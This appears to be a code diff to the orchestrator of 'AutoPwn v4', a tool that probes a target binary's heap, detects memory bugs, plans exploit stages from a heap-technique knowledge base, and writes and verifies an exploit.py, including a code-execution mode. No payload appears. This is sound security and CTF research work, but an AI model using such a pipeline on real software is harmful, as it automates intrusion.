+                prober = ChunkProber(self.target, interface_map,
+                                     libc_path=libc_path, ld_path=ld_path,
+                                     timeout=3)
+                return prober.probe()
+
+            # Run probe in a separate process with 8s timeout
+            with multiprocessing.Pool(1) as pool:
+                layout = pool.apply_async(_probe).get(timeout=8)
+            if layout:
+                env.chunk_size = layout["chunk_size"]
+                env.c0_addr = layout["c0_addr"]
+                env.c1_addr = layout["c1_addr"]
+                env.c2_addr = layout["c2_addr"]
+                if layout.get("heap_base"):
+                    env.heap_base = layout["heap_base"]
+                print(f"      probed: chunk_size={hex(env.chunk_size)}, "
+                      f"c0={hex(env.c0_addr)}, c1={hex(env.c1_addr)}")
+            else:
+                raise Exception("probe returned None")
+        except Exception:
+            print(f"      probe skipped (binary timeout) — using chunk_size={hex(env.chunk_size)}")
+            # env.chunk_size keeps its default (0x40)
+
+        # Phase 2b: Operation Generalizer (if trace events exist)
+        generalized = self._run_generalizer()
+
+        # Phase 3: Bug Detection
+        self.log("PHASE 3", "Detecting bugs...")
+        from core.analysis.bug_detector import BugDetector
+        trace_path = os.path.join(self.internal_artifacts, "trace_events.json")
+        trace_events = []
+        if os.path.exists(trace_path):
+            with open(trace_path) as f:
+                trace_events = json.load(f)
+        bugs = BugDetector.detect(trace_events, interface_map)
+
+        # Enrich bugs from NLP composite
+        if nlp_composite:
+            nlp_bugs = nlp_composite.get("composite_taxonomy", {}).get("bugs", [])
+            for b in nlp_bugs:
+                bugs.add(b, "nlp_composite", 0.6)
+
+        print(f"      bugs: {sorted(bugs.names()) if bugs.names() else 'none (using default)'}")
+        if not bugs.names():
+            bugs.add("uaf", "default_assumption")
+            bugs.add("double_free_possible", "default_assumption")
+            bugs.add("potential_uaf", "default_assumption")
+
+        # Phase 4: AbstractHeapState
+        self.log("PHASE 4", "Building heap state model...")
+        from core.state.heap_state import AbstractHeapState
+        from core.state.invariants import HeapInvariant
+        state = AbstractHeapState.build_empty(max_slots=env.max_slots)
+        for bug_name in bugs.names():
+            state.tags.add(bug_name)
+        state.tags.add("heap_leak_possible")
+        state.tags.add("libc_leak_possible")
+        state = state.allocate_at_slot(0, 0x40)
+        state = state.free_slot(0)
+        if trace_events:
+            for ev in trace_events[:8]:
+                etype = ev.get("type", "")
+                if etype == "Alloc":
+                    state = state.allocate_at_slot(ev.get("slot", 0), ev.get("size", 0x40))
+                elif etype == "Free":
+                    state = state.free_slot(ev.get("slot", 0))
+                elif etype == "Read":
+                    state = state.view_slot(ev.get("slot", 0))
+                elif etype == "Write":
+                    state = state.edit_slot(ev.get("slot", 0))
+        ok = HeapInvariant.check_all(state)
+        if not ok:
+            print("      [WARN] Heap invariants violated (non-fatal)")
+        print(f"      state: {len(state.slots)} slots, {len(state.regions)} regions, "
+              f"{len(state.tags)} tags")
+
+        # Phase 5: Capability Derivation
+        self.log("PHASE 5", "Deriving capabilities from state...")
+        from core.capabilities.deriver import CapabilityDeriver
+        caps = CapabilityDeriver.derive(state)
+        print(f"      capabilities: {[c.describe() for c in caps]}")
+
+        # Phase 6: Knowledge Base + Planning
+        self.log("PHASE 6", "Querying knowledge base and planning...")
+        from core.knowledge_base.loader import get_knowledge_base
+        from core.planner.constraint_planner import ConstraintPlanner, ExploitMode
+
+        kb = get_knowledge_base()
+        print(f"      KB: {len(kb._get_json_techniques())} techniques, "
+              f"{len(kb.parsed_techniques)} parsed how2heap entries")
+
+        plan_mode = ExploitMode.PRIMITIVES_ONLY  # Always use KB-driven primitives
+        planner = ConstraintPlanner(kb=kb, mode=plan_mode)
+        plan = planner.plan(state, bugs, caps, env)
+
+        if not plan or not plan.stages:
+            diagnosis = plan.diagnosis if plan else {"global": "planning returned None"}
+            print("[-] No exploit path found through knowledge base.")
+            print("    Diagnosis:")
+            for k, v in diagnosis.items():
+                print(f"      [{k}] {v}")
+            sys.exit(1)
+
+        print(f"      target: {plan.target.name} ({plan.target.exploit_type})")
+        print(f"      stages: {[s.name for s in plan.stages]}")
+        print(f"      techniques: {[s.technique_id for s in plan.stages]}")
+        print(f"      confidence: {plan.confidence:.2f}")
+
+        if plan.diagnosis:
+            print(f"      warnings:")
+            for k, v in plan.diagnosis.items():
+                print(f"        [{k}] {v}")
+
+        # Phase 7: Code Generation
+        self.log("PHASE 7", "Generating exploit code...")
+        from core.codegen.capability_codegen import CapabilityCodegen
+        codegen = CapabilityCodegen(plan, interface_map, self.target,
+                                     libc_path=libc_path, ld_path=ld_path, kb=kb, env=env)
         exploit_path = os.path.join(self.exploits_dir, "exploit.py")
-        if os.path.exists(exploit_path):
-            print(f"[SUCCESS] Exploit generated at: {exploit_path}")
-            print(f"[INFO] Planning details: {os.path.join(self.artifacts_dir, 'final_plan.json')}")
+        codegen.save(exploit_path)
+        print(f"      OK — {exploit_path}")
+
+        # Phase 8: Verification
+        self.log("PHASE 8", "Verifying exploit...")
+        from core.executor.capability_verifier import CapabilityVerifier
+        verifier = CapabilityVerifier()
+        report = verifier.verify(exploit_path, self.target, timeout=15, runs=3)
+        print(f"      Verification results:")
+        for line in report.summary():
+            print(line)
+
+        report_path = os.path.join(self.internal_artifacts, "verification_report.json")
+        CapabilityVerifier.save_report(report, report_path)
+
+        # Sync artifacts
+        self._save_artifacts(plan, env, report)
+
+        print("=" * 60)
+        if report.all_robust():
+            print("[SUCCESS] All primitives verified robustly.")
+            print("")
+            print("  Technique hints (also in exploit.py comments):")
+            from core.planner.technique_ir_gen import TechniqueIRGenerator
+            for stage in plan.stages:
+                hint = TechniqueIRGenerator.format_hint(
+                    stage.technique_id, env.glibc_version,
+                    ", ".join(stage.produces),
+                )
+                for line in hint.split("\n"):
+                    print(f"  {line}")
         else:
-            print("[ERROR] Exploit generation failed.")
-        print("="*60 + "\n")
+            print("[WARNING] Some primitives not robust. See report.")
+        print(f"[INFO] Exploit: {exploit_path}")
+        print(f"[INFO] Report: {report_path}")
+        print("=" * 60 + "\n")
+
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="AutoPwn Orchestrator v3.0")
-    parser.add_argument("binary", help="Path to the target binary")
-    parser.add_argument("--angr", action="store_true",
-                       help="Use angr symbolic tracing instead of DynamoRIO")
+    parser = argparse.ArgumentParser(
+        description="AutoPwn v4 — Capability-Driven Primitive Exploit Generation"
+    )
+    parser.add_argument("binary", help="Path to target binary")
+    parser.add_argument("--mode", choices=["primitives", "full"], default="primitives",
+                        help="Exploit mode: primitives (leaks only) or full (code exec)")
+    parser.add_argument("--writeup-dir", default=None,
+                        help="Directory containing CTF writeup .txt files for NLP analysis")
+    parser.add_argument("--angr", action="store_true", default=False,
+                        help="Use angr symbolic execution (default: DynamoRIO)")
     args = parser.parse_args()
 
     if not os.path.exists(args.binary):
         print(f"Error: Binary {args.binary} not found.")
         sys.exit(1)
 
-    framework = AutoPwnFramework(args.binary)
-    framework.run(use_angr=args.angr)
+    framework = AutoPwnFramework(
+        args.binary,
+        mode=args.mode,
+        writeup_dir=args.writeup_dir,
+    )
+    framework.run()
